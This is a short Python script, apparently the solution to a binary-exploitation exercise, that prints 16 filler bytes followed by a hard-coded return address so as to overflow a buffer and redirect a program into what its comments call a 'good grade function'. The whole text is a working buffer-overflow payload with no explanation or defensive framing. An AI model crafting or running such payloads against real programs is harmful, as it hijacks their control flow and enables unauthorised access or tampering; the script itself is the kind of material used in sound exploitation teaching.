import sys
from struct import pack

#A's to overflow buffer
#Bytes are the adress of good grade function
sys.stdout.buffer.write(b"a"*16 + b"\x97\x97\x04\x08")
